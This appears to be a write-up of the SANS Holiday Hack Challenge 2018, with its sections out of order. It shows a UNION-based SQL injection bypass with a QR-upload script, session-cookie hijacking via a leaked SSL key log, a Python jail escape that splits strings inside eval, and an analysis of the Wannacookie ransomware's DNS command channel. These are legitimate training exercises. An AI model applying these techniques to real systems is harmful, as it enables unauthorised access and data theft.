'Sources' tab of Google Chrome's DevTools. Brute-forcing the passcode: By examining the passcode application through the Chrome DevTools' Network tab, we can learn how it performs the password check and verifies validity. Here we see that the application checks the passcode's correctness by sending a GET request to https://doorpasscoden.kringlecastle.com/checkpass.php with two GET parameters: 'i' - the passcode to check, encoded using the numbers 0 to 3. resourceId - set to undefined If the passcode submitted is incorrect, then the webpage responds with: {\"success\":false,\"message\":\"Incorrect guess.\"} If the passcode submitted is correct (0120) then the page responds with: {\"success\":true,\"resourceId\":\"undefined\",\"hash\":\"0273f6448d56b3aba69af76f99bdc741 268244b7a187c18f855c6302ec93b703\",\"message\":\"Correct guess!\"} Since the total number of passcode combinations is only 256, or 4^4 , this is well within the possibility for a computer to brute force.

For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge. We can find this challenge at the very end of the second floor's right hallway. Our first step to to examine the example employee badge given for the challenge. Decoding the QR code in the sample badge, using the following website https://zxing.org/w/decode.jspx, gives the the following string: oRfjg5uGHmbduj2m Intial analysis of the string doesn't decode it to anything else, leaving us to believe that it simply may just be an employee ID. Clicking on the Scan-O-Matic brings us to the scanning UI, with a webcam display located on the left-side screen. Attempting to use the fingerprint scanner gives us the following error message: QR Code Not Found. Only QR Code and White Space may be visible! We also find that we can upload images via the USB port on the bottom right. After uploading the Alabaster's badge, we receive the following error code: PNG Files Only We can convert the badge to a PNG image, but using it still gives us another error message: Authorized User Account Has Been Disabled! By examining the application using Chrome's DevTools, we discover several things. - The URL for the application is located at https://scanomatic.kringlecastle.com/index.html - The app sends a POST request to https://scanomatic.kringlecastle.com/upload with the image file base64-encoded in the b64barcode parameter or in raw form using the barcode parameter. - Using the fingerprint scanner simply sends a blank image to the server; hence the error about not recognizing a QR code. - The app also performs client-side, file-type verification before submitting it to the server. - Since the server only looks for a recognizable QR code, we don't need to worry about pasting a replacement code over the sample badge; we can just send standalone codes to the server. This ability allows us to automate the QR code creation and submission process using the following script: #!/bin/bash qrencode -o q6_exploit.png $1 curl --cookie resource_id=false -X POST -F barcode=@q6_exploit.png https://scanomatic.kringlecastle.com/upload This script converts a string argument into a QR code, submits it to the upload server, and reads back the server's response. Using this script, we test out various types of input to determine the backend SQL query, based on the error messages received. Inputting a single quote, however, gives us a very descriptive error message, informing us of the entire backend query, as well as what database servertype it is, a MariaDB server. {\"data\":\"EXCEPTION AT (LINE 96 \\\"user_info = query(\\\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\\\".format(uid))\\\"): (1064, u\\\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1\\\")\",\"request\":false} After several attempts, we begin to look into UNION injections. Surprisingly, simply setting up the query for a UNION injection attack provides us with an authentication bypass. Providing this data, ' UNION SELECT 'A', 'B', 'C , causes the server to respond with: {\"data\":\"User Access Granted - Control number 19880715\", \"request\":true, \"success\": {\"hash\" : \"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb\", \"resourceId\":\"false\" }} Research into this issue leads me to believe that the server doesn't validate the values returned by the SQL query. As long as it receives a row and that row doesn't have integer 0 as the enabled value, it'll mark the user as valid. This injected query ensures that the server receives a row with the values 'A', 'B', 'C'. Since 'C' is not a 0, the scanner allows that user through.

After registering a Packalyzer account and logging in, we're greeted with an interface that allows us to analyze network traffic, including a function to sniff and record traffic for 20 seconds. Our first step is to take a recording of some traffic and download the generated PCAP file and for analysis in Wireshark. After opening this data within Wireshark, we notice a lot of encrypted TLS packets. This prevents us from deciphering the actual data being transmitted until we can find the SSL keys. By analyzing the webpage in Chrome DevTools, we discover several interesting pieces of information: - Many of the application's supporing files are accessed on port 80 via HTTPS within a pub directory. - There exists an app.js file, which we currently can't see under the sources tab. Using this information, we attempt to search for the app.js file. Although we cannot find it on the normal HTTPS port (443), we successfully find the file on port 80, in either https://packalyzer.kringlecastle.com:80/app.js or https://packalyzer.kringlecastle.com:80/pub/app.js. Analyzing app.js provides us with several key pieces of information about the Packalyzer application: - It runs using HTTP2. - The SSL key log file is located in __dirname + process.env.DEV + process.env.SSLKEYLOGFILE . The log file's location is not immediately useful since it's held within ENV variables. However, by attempting to access the variable names on port 443, we notice that the application prints out the variable's actual value. This allows us to determine the log file's directory and file name ( /dev/packalyzer_clientrandom_ssl.log ) to download it for our use. bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl https://packalyzer.kringlecastle.com/DEV/reveal Error: ENOENT: no such file or directory, open '/opt/http2/dev//reveal' bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/reveal Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/reveal' bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s https://packalyzer.kringlecastle.com/dev/ packalyzer_clientrandom_ssl.log | head -n 3 CLIENT_RANDOM 812B81585E2D2748BDEAD5210275349893FE9D24E9A06A53477946562E4AD204 98D921E75354592C4BB1FC67FD35E41EB56501C9DBA5C49A896360AD3 AA14436675E002D17C0E1ACD5CDA38E58058B18 CLIENT_RANDOM 71BB674B0A99BAFC8EEC870A405DF93F1AD0F4845F88F89E89572C2A1FBEACDA EACBA6F6B87C6F9A668E25950EEF18BE00F2E9EB6C4E15DF49B730F86 F19ADFA22322E9903CB5AD73B3518702DFE32AC CLIENT_RANDOM 2255ECB935DC13C45B078B206F9E584322B65A191A13DF14E6A8961E10654E21 E1F907E4DC18095442F1797EB43FDF53BD35579EE1BF0F419824E2D09 C44E18882B59D4529CC992A56BD76410C8857F7 Now, by using the Packalyzer application and our access to the SSL key log, we can decrypt SSL traffic on the network and reveal their plaintext contents. Although these packets only show requests for the Packalyzer application, we can still examine the headers of each request to gather cookies for us to impersonate other users. To accomplish this, we need to gather values of for the 'PASESSION' cookie. We gather and test several of these cookies until we come across one that logs us in as 'alabaster', a user with admin privileges and a saved capture file named super_secret_packet_capture.pcap . This capture file contains SMTP traffic of alabaster.snowball@mail.kringlecastle.com sending an email with an attachment to holly.evergreen@mail.kringlecastle.com, the two individuals we're concerned with for this challenge. After extracting and reading the attached pdf file, we learn that the song described by Alabaster in his communications with Holly is Mary Had a Little Lamb . A piano keyboard gives us easy access to every (western) tone. As we go from left to right, the pitches get higher. Pressing the middle A, for example, would give us a tone of 440 Hertz. Pressing the next A up (to the right) gives us 880 Hz, while the next one down (left) produces 220 Hz. These A tones each sound very similar to us - just higher and lower. Each A is an \u201coctave\u201d apart from the next. Going key by key, we count 12 \u201chalf tone\u201d steps between one A and the next - 12 steps in an octave. As you may have guessed, elf (and human) ears perceive pitches logarithmically. That is, the frequency jump between octaves doubles as we go up the keyboard, and that sounds normal to us. Consequently, the precise frequency of each note other than A can only be cleanly expressed with a log base 12 expression. Ugh! For our purposes though, we can think of note separation in terms of whole and half steps. Have you noticed the black keys on the keyboard? They represent half steps between the white keys. For example, the black key between C and D is called C# (c-sharp) or Db (d-flat). Going from C to D is a whole step, but either is a half step from C#/Db. Some white keys don\u2019t have black ones between them. B C and E F are each only a half step apart. Why? Well, it turns out that our ears like it that way. Try this: press C D E F G A B C on a piano. It sounds natural, right? The \u201cC major\u201d scale you just played matches every other major scale: - whole step from C to D - whole step from D to E - half step from E to F - whole step from F to G - Whole step from G to A - Whole step from A to B, and finally - Half step from B to C If you follow that same pattern (whole whole half whole whole whole half), you can start from any note on the keyboard and play a major scale. So a Bb major scale would be Bb C D Eb F G A Bb. You can get this by counting whole and half steps up from Bb or by taking each note in the C major scale and going down a whole step. This uniform shifting of tones is called transposition. This is done all the time in music because of differences in how instruments are designed, the sound an arranger wants to achieve, or the comfortable vocal range of a singer. Some elves can do this on the fly without really thinking, but it can always be done manually, looking at a piano keyboard. To look at it another way, consider a song \u201cwritten in the key of Bb.\u201d If the musicians don\u2019t like that key, it can be transposed to A with a little thought. First, how far apart are Bb and A? Looking at our piano, we see they are a half step apart. OK, so for each note, we\u2019ll move down one half step. Here\u2019s an original in Bb: D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb And take everything down one half step for A: C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A We\u2019ve just taken Mary Had a Little Lamb from Bb to A!","title":"8) Network Traffic Forensics"},{"location":"#9-ransomware-recovery","text":"Alabaster Snowball is in dire need of your help.

Snort IDS is alerting on each new ransomware infection in our network. Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document? All the elves were emailed a cookie recipe right before all the infections. Take this document with a password of elves and find the domain it communicates with. The document itself seems fairly innocuous at first, containing only the recipe for chocolate chip cookies. However, by extracting the VBA macros embedded within the file, we can see the malicious intent behind it.

Do some more analysis and see if you can find a fatal flaw and activate it! Similar to the first de-obfuscation step, we remove iex from the PowerShell command to further deobfuscate this code. Due to the length of the returned output, we simply write the code to wannacookie.min.ps1 , which is what the hex-string 77616E6E61636F6F6B69652E6D696E2E707331 translates to.

This gives evidence that it's an attack that directly targets Santa's network. Like the previous deobfuscation techniques, we remove any potentially damaging code from the code block, modify it to output the desired information, and run it within PowerShell to see the decoded output. Another step for this particular challenge is that we much also import the various functions the \"killswitch\" method makes use of in order for the decoding process to work. After analyzing the various nested functions, we can determine that the killswitch method decodes the domain by simply using an XOR decryption between 1f0f0202171d020c0b09075604070a0a and the data retrieved from the CnC server, which is 66667272727869657268667865666B73 in this case.

One of the passwords will unlock our access to the vault so we can get in before the hackers. Immediately following the killswitch and target verification functions, we see the ransomware's file encryption procedure. It first creates and sends back the encryption key by downloading the CnC server's public key via DNS ( server.crt ), generating a random, 256-bit AES encryption key, and sending that back to the server after encrypting the key using their public key. Afterwards, it encrypts the all .elfdb files on the machine using that key. Finally, it clears the Hex_key and Byte_key variables, reducing the chances for us to find the unencrypted keys within memory. However, the public key encrypted key may still be found.

Although we found several candidates for encryption keys, none of them allow us to decrypt Alabaster's elfdb file. The only remaining option right now is to somehow decrypt the encrypted key by retrieving the server's private key.

Hopefully, we can retrieve the server's private key in case the attacker inadvertently left it available for public download. Upon attempting this, we find that we successfully retrieve the server's private key.

We can also check a tune by sending a GET request to https://pianolockn.kringlecastle.com/checkpass.php, with two GET parameters. i is the notes played and resourceID is undefined . This reveals to us that the entire incident was planned out by Santa , who is looking to find new cybersecurity specialists for his operation next year. You DID IT! You completed the hardest challenge. You see, Hans and the soldiers work for ME. I had to test you. And you passed the test! You WON! Won what, you ask? Well, the jackpot, my dear! The grand and glorious jackpot! You see, I finally found you! I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers. That\u2019s why we had so many different challenges this year. We needed to find someone with skills all across the spectrum. I asked my friend Hans to play the role of the bad guy to see if you could solve all those challenges and thwart the plot we devised. And you did! Oh, and those brutish toy soldiers? They are really just some of my elves in disguise. See what happens when they take off those hats? Based on your victory\u2026 next year, I\u2019m going to ask for your help in defending my whole operation from evil bad guys. And welcome to my vault room. Where's my treasure? Well, my treasure is Christmas joy and good will. You did such a GREAT job! And remember what happened to the people who suddenly got everything they ever wanted?

Maybe you can figure it out using this Cranberry Pi terminal? The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken. PowerShell itself can be tricky when handling user input. Special characters such as and ; can be used to inject commands. I think that system is one of Alabaster's creations. He's a little ... obsessed with SQLite database storage. I don't know much about SQLite, just the .dump command. Based on the explaination from Minty, this is most likely a 'command injection' exercise. We just hired this new worker, Californian or New Yorker? Think he's making some new toy bag...

At Santa's Castle, our employees are our family. We care for each other, and support everyone in our common goals. Your first test at Santa's Castle is to complete the new employee onboarding paperwork. Don't worry, it's an easy test! Just complete the required onboarding information below.

'Tis some caroler, he muttered, tapping at my sleigh house door-- Only this and nothing more. Then, continued with more vigor, came the sound he didn't figure, Could belong to one so lovely, walking 'bout the North Pole grounds. But the truth is, she WAS knocking, 'cause with him she would be talking, Off with fingers interlocking, strolling out with love newfound? Gazing into eyes so deeply, caring not who sees their rounds. Oh, 'twould make his heart resound! Hurried, he, to greet the maiden, dropping rag and brush - unlaiden. Floating over, more than walking, moving toward the sound still knocking, Pausing at the elf-length mirror, checked himself to study clearer, Fixing hair and looking nearer, what a hunky elf - not shocking! Peering through the peephole smiling, reaching forward and unlocking: NEVERMORE in tinsel stocking! Greeting her with smile dashing, pearly-white incisors flashing, Telling jokes to keep her laughing, soaring high upon the tidings, Of good fortune fates had borne him. Offered her his dexter forelimb, Never was his future less dim! Should he now consider gliding-- No - they shouldn't but consider taking flight in sleigh and riding Up above the Pole abiding? Smile, she did, when he suggested that their future surely rested, Up in flight above their cohort flying high like ne'er before! So he harnessed two young reindeer, bold and fresh and bearing no fear. In they jumped and seated so near, off they flew - broke through the door! Up and up climbed team and humor, Morcel being so adored, By his lovely NEVERMORE! \\- Morcel Nougat At first glance, 'NEVERMORE' seems like the subject of this poem.

Have you been able to solve the lock with the funny shapes?

I've even seen de Bruijn sequence generators online. Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well. Mathematically this is k=4, n=4 to generate the de Bruijn sequence. Math is like your notepad and pencil - can't leave home without it! I heard Alabaster lost his badge! That's pretty bad.

I am Holly Evergreen, and now you won't believe: Once again the striper stopped; I think I might just leave! Bushy set it up to start upon a website call. Darned if I can CURL it on - my Linux skills apall. Could you be our CURLing master - fixing up this mess? If you are, there's one concern you surely must address. Something's off about the conf that Bushy put in place. Can you overcome this snag and save us all some face? Complete this challenge by submitting the right HTTP request to the server at http://localhost:8080/ to get the candy striper started again. You may view the contents of the nginx.conf file in /etc/nginx/, if helpful. Based on the instructions from Holly and the login message, our goal is to submit the correct HTTP request to the webserver located on localhost:8080 . However, sending a regular GET request to localhost:8080 gives us a response made up of non-printable, binary data. After examining our home directory, we see a .bash_history file with data, readable by us. Upon examining elf's bash history, we find a very interesting curl command that implies the webserver on 8080 actually handles HTTP2 requests. elf@53ab4f44ffa5:~$ ls -lah total 24K drwxr-xr-x 1 elf elf 4.0K Dec 14 16:15 . drwxr-xr-x 1 root root 4.0K Dec 14 16:14 .. -rw-r--r-- 1 elf elf 464 Dec 14 16:13 .bash_history -rw-r--r-- 1 elf elf 220 May 15 2017 .bash_logout -rw-r--r-- 1 elf elf 3.5K Dec 14 16:15 .bashrc -rw-r--r-- 1 elf elf 675 May 15 2017 .profile elf@53ab4f44ffa5:~$ cat .bash_history netstat -ant ncat --broker -nlvp 9090 echo \\302\\257\\_(\\343\\203\\204)_/\\302\\257 /tmp/shruggins cat /tmp/shruggins curl --http2-prior-knowledge http://localhost:8080/index.php telnet towel.blinkenlights.nl [...snip...] After attempting that command without any modification, we recieve a response instructing us to send a POST request with a parameter of status=on . elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On'er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on /body /html To do this, we simply add the flag --data \"status=on\" to our curl command.

Bad guys have us tangled up in pepperminty kelp! Password spraying is to blame for this our grinchly fate. Should we blame our password policies which users hate?

Tell us who fell victim, and please handle this with tact... Submit the compromised webmail username to runtoanswer to complete this challenge. We first test out the evtx_dump.py script to see what input it accepts and what format it outputs the logs in. After examining the output, we notice the line, EventID Qualifiers=\"\" 4647 /EventID , which identifies what EventID this log entry falls under. All Windows Security Log Events have a numeric EventID associated with it that describes what type of event it is.

Our full command for this step involves several steps: The evtx_dump.py output while hiding all errors using 2 /dev/null . This output is then piped to a grep command that searches for the lines that include the EventID 4624 , as well as a few lines before and after to make sure we grab the entire log entry. Finally, we pipe that output to the head command, just to limit our total output for analysis purposes and only view the first matched entry. elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4624 /EventID ' | head -n 30 EventData /EventData /Event Event xmlns= http://schemas.microsoft.com/win/2004/08/events/event System Provider Name= Microsoft-Windows-Security-Auditing Guid= {54849625-5478-4994-a5ba-3e3b0328c30d} /Provider EventID Qualifiers= 4624 /EventID Version 2 /Version Level 0 /Level Task 12544 /Task Opcode 0 /Opcode Keywords 0x8020000000000000 /Keywords TimeCreated SystemTime= 2018-09-10 12:19:20.695601 /TimeCreated EventRecordID 231726 /EventRecordID Correlation ActivityID= RelatedActivityID= /Correlation Execution ProcessID= 664 ThreadID= 668 /Execution Channel Security /Channel Computer WIN-KCON-EXCH16.EM.KRINGLECON.COM /Computer Security UserID= /Security /System EventData Data Name= SubjectUserSid S-1-0-0 /Data Data Name= SubjectUserName - /Data Data Name= SubjectDomainName - /Data Data Name= SubjectLogonId 0x0000000000000000 /Data Data Name= TargetUserSid S-1-5-18 /Data Data Name= TargetUserName SYSTEM /Data Data Name= TargetDomainName NT AUTHORITY /Data Data Name= TargetLogonId 0x00000000000003e7 /Data Data Name= LogonType 0 /Data Data Name= LogonProcessName - /Data Data Name= AuthenticationPackageName - /Data Based on this entry, we determine that TargetUserName is the value we must filter for. This line is the same for both event types. Now, we grab a list of users who successfully logged on, as well as users who have a failed login attempt. Our commands for this part involves several steps: We first find all entries for our desired Event ID and then retrieve the usernames within them. We also remove all duplicate usernames. Afterwards, we filter out the system accounts, leaving us with all user accounts who have a log entry for that Event ID. Additionally, the style of the usernames for failed and successful logons is slightly different. To manage this, we perform a final grep to format all usernames into a firstname.lastname style in order to allow us to compare the files against each other. elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4625 /EventID ' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS |Backup|WIN-KCON-EXCH)' failedlogons.txt elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4624 /EventID ' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS |Backup|WIN-KCON-EXCH)' successfullogons.txt elf@396cf1de836c:~$ cat failedlogons.txt | grep -Eo [a-z]+\\.[a-z]+ failed.txt elf@396cf1de836c:~$ cat successfullogons.txt | grep -Eo [a-z]+\\.[a-z]+ successful.txt Since a password spraying attack tests each account using only one password, the compromised account will be the username who has a successful logon, with no failed attempts.

Beat this challenge - Mark and Bag it! -SugarPlum Mary To complete this challenge, escape Python and run ./i_escaped Our goal for this terminal exercise is to simply find a way to run system commands from the Python jailshell. We first attempt to execute system commands using os.system() and to import libraries with import . We find that both of these commands are prohibited by the shell. However, the eval() function is still available, allowing us to bypass this restriction by simply dividing the full command to fool simple blacklist matching. os.system( id ) Use of the command os.system is prohibited for this question. import os; Use of the command import is prohibited for this question. eval built-in function eval To perform the blacklist bypass, we first assign the variable os with __import__(\"os\") . This will allow us to run system commands by using eval() and dividing up the os.system() command within it. Here, we test out this functionality by running id , which successfully provides us with elf's uid. os = eval('__imp' + 'ort__( o' + 's )') eval('o' + 's.sys' + 'tem(' + ' id )') uid=1000(elf) gid=1000(elf) groups=1000(elf) 0 Now, all we need to do is to replace id with ./i_escaped in order to complete this exercise. eval('o' + 's.sys' + 'tem(' + ' ./i_escaped )') Loading, please wait...... ____ _ _ | _ \\ _ _| |_| |__ ___ _ __ | |_) | | | | __| '_ \\ / _ \\| '_ \\ | __/| |_| | |_| | | | (_) | | | | |_|___ \\__, |\\__|_| |_|\\___/|_| |_| _ _ | ____||___/___ __ _ _ __ ___ __| | | | _| / __|/ __/ _` | '_ \\ / _ \\/ _` | | | |___\\__ \\ (_| (_| | |_) | __/ (_| |_| |_____|___/\\___\\__,_| .__/ \\___|\\__,_(_) |_| That's some fancy Python hacking - You have sent that lizard packing! -SugarPlum Mary You escaped! Congratulations! 0 Yay, you did it! You escaped from the Python! As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer. Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root. Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code. There was suspicious-looking development code using environment variables to store SSL keys and open up directories. This elf then told me that manipulating values in the URL gave back weird and descriptive errors. I'm hoping these errors can't be used to compromise SSL on the website and steal logins. On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises?

Based on the conversation with Shinny and the logon message, our goal for this exercise is to manipulate the sleighbell-lotto program into letting us win the lottery. Our first step is to see what is available to us and how the program runs. elf@95d7e6283d56:~$ ls -lah total 60K drwxr-xr-x 1 elf elf 4.0K Dec 14 16:22 . drwxr-xr-x 1 root root 4.0K Dec 14 16:21 .. -rw-r--r-- 1 elf elf 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 elf elf 3.7K Dec 14 16:21 .bashrc -rw-r--r-- 1 elf elf 807 Apr 4 2018 .profile lrwxrwxrwx 1 elf elf 12 Dec 14 16:21 gdb - /usr/bin/gdb lrwxrwxrwx 1 elf elf 16 Dec 14 16:21 objdump - /usr/bin/objdump -rwxr-xr-x 1 root root 38K Dec 14 16:22 sleighbell-lotto elf@95d7e6283d56:~$ ./sleighbell-lotto The winning ticket is number 1225.

Rolling the tumblers to see what number you'll draw... You drew ticket number 8298! Sorry - better luck next year! From this, we see that the program generates a random integer on each run and compares it with the integer 1225 . We also can use the debugging tools gdb and objdump .

Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files. - Shinny Upatree","title":"Jumping to the 'winnerwinner' function."},{"location":"#appendix","text":"","title":"Appendix"},{"location":"#a-google-ventilation-maze","text":"Previously, we found two ventilation maps during Challenge 4.

Google Ventilation Maze"},{"location":"#b-wannacookie-malware-analysis","text":"Wannacookie is a highly-targeted form of ransomware aimed at two specific targets: Computers on the KRINGLECASTLE domain, and .elfdb files. This makes the malware fairly harmless to any other system. However, it uses a novel form of command and control (CnC) to transfer binary data through domain name system (DNS) requests, which still makes this an interesting piece of malware to analyze. Provided is a high-level walkthrough of Wannacookie's infection and destruction process. The detailed analysis follows this chart. To fully analyze the behavior of Wannacookie , we first spin up a Windows 10 virtual machine to see the execution of the malware in a controlled environment. We will run the PowerShell script directly, rather than from the CHOCOLATE_CHIP_COOKIE_RECIPE.docm file since this VM doesn't have access to Microsoft Word . There are several factors to Wannacookie that makes it relatively safe to analyze: - It does not seek out other computers to infect, so it's not virulent. - It only targets files with the .elfdb extension, which is designed solely for the purpose of the SANS Holiday Hack Challenge 2018 and not used for real-world data. Our first attempt to run Wannacookie fails since we are not on a KRINGLECASTLE domain. In order to allow us to see its full execution, we remove the safety switch. During the malware's execution, it retrieves data over the DNS in a novel way. It first makes a request to the DNS CnC server with a hex-encoded string as the subdomain. If it's requesting a file, then the server responds with a length value within the TXT record. Due to the limitations of DNS records, the server can only reply with 254-char, or 127-byte, chunks. Thus, the malware uses the initial length value to know how many requests it needs to make to retrieve the full file. After retrieving the length value, the malware makes several DNS requests, in sequence, with the format of: chunk_number . requested_file .erohetfanu.com . The chunk_number increments from 0 to one less than the specified length from before. For each request, the server replies with a portion of the file as a hex string within the TXT record. Upon completing all DNS requests, the malware has downloaded the full file from the CnC server. The script takes the following actions: 1. Performs the killswitch check. The malware generates a domain to lookup through several novel techniques that attempt to obfuscate its methods and the resulting domain name. - It first retreives a hex string from the TXT record of 6B696C6C737769746368.erohetfanu.com (the hex subdomain translating to killswitch ), which is an encrypted value that contains the killswitch domain name: 66667272727869657268667865666B73 - Another variable, $S1 , contains a hex string of gzip data that the malware translates all the way to the hex-values of its unzipped contents; an XOR key for the previous value: 1f0f0202171d020c0b09075604070a0a - Finally, the script performs an XOR operation between the two values to decrypt the domain name used as a killswitch: yippeekiyaa.aaay - The script attempts to resolve this domain name and if successful, halts further operation. Checks if the target is within the KRINGLECASTLE domain and has TCP port 8080 open on localhost. If either of these are not true, then the script exits. Retrieves the CnC server's public key via DNS. This request is formatted as: 7365727665722E637274.erohetfanu.com . The subdomain is hex, which translates to server.crt . The server replys in the TXT record with how many subsequent requests the script should make. Generates a random, 256-bit encryption key along with a SHA1 hash of a hex version of that key. Encrypts the key with the server's public key and sends it to the CnC server over DNS. After asymmetric encryption, the key ends up being 2048-bits long. After the first submission, the CnC server sends back a random, 20-byte ID number for that key, known by the program as a \"Cookie ID\". Based upon limits of DNS requests, the script breaks up the encrypted key into 128-bit (32 char) chunks and sends each chunk sequentially. The DNS requests are formatted like: First chunk as chunk.6B6579666F72626F746964.erohetfanu.com . Where the hex translates to keyforbotid . In return, the server provides the 20-byte \"Cookie ID\" within the TXT record. All subsequent chunks as cookie_id.chunk.6B6579666F72626F746964.erohetfanu.com . The server replys with a blank TXT record for these requests. Afterwards, it creates a timestamp of the current time in order to serve a deadline for the victim with the ransom note. It then gathers a list of files with the .elfdb file extension within the Desktop, Documents, Videos, Pictures, and Music folders for that user, additionally ignoring files with .wannacookie as an extension. Using that file list, the script encrypts each file using the generated key in AES CBC mode, while also generating the IV for that file. The IV's length is stored within the first four bytes (a 32-bit integer) of the encrypted file, with the actual IV following it, in order to allow the script to later decrypt it with only the key. After completing the encryption process, it retrieves an HTML file from the CnC server via DNS and starts a local HTTP server on port 8080. This server provides the ransom note to the victim and instructions on how to pay and decrypt their files. We notice the file's execution taking an exceptionally long amount of time, this is due to the malware downloading source.min.html over DNS from erohetfanu.com , and then having to translate it to ASCII. After completing the decoding process, the script starts an HTTP server on port 8080. The ransom note application checks for payment upon every refresh via the cookie_is_paid resource. This causes the application to send a DNS request to the CnC server in the format of cookie_id.72616e736f6d697370616964.erohetfanu.com . The CnC server replies with a hex string in the TXT record that translates to False . By analyzing the script, we see that the server would reply with a 32 character hex-string if it believes its been paid, which is most likely the encryption key. The decrypt function uses the previously calculated SHA-1 hash to check if the victim enters the correct key. If it validates the key, then it gathers all .wannacookie files and performs the decryption process. Since we recorded the network traffic during the exploitation process and have the server's private key in hand, we can simply decrypt the submitted key and perform the decryption process, without checking for payment with the CnC server. bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt 008f9236b701c97fcdbd159d1c189a9841e85a73c8a8a7e69dae459e50ec0101a71 f00c9cf0bc59c04065085da7d5fa2e1f748fe9ff8fc77fe09510f0e8496c062fe20 e30b4e614000e9e2befe126b4fcea88adc602c05041a4c74344eb7bedd46f4ccbca beb1fc54b8fb1ab519b35a2348ee4c7368db8561eb0488894975466e7b2415617a4 4175b9a1745cfed6b2dfebc2c5eec4ada3b3a78910384be7d074dd5f08ea87a6f9e 4107df89b1d1fdd9da7b7110d0c29ff443e7e7259e3ac6e3755f635690f8c71529f 67998d0aa3d159ce9d14789022c55de0e3991cee7c2fb103dc01db82d4b4516b6ac 4b96bb37809477f2d509823612a6cdc853471816fde bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt | xxd -r -p VM_encrypted_key.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl rsautl -decrypt -oaep -in VM_encrypted_key.key -out VM_key.key -inkey server.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ ls -lah VM_key.key -rwxrwxrwx 1 bernard bernard 16 Dec 28 15:42 VM_key.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ xxd -p VM_key.key c5a6236a762ecfbf935b428d43eae4c7 Now, by submitting c5a6236a762ecfbf935b428d43eae4c7 as the decrypt key into the Wannacookie application, we can initiate the decryption process and recover our file.
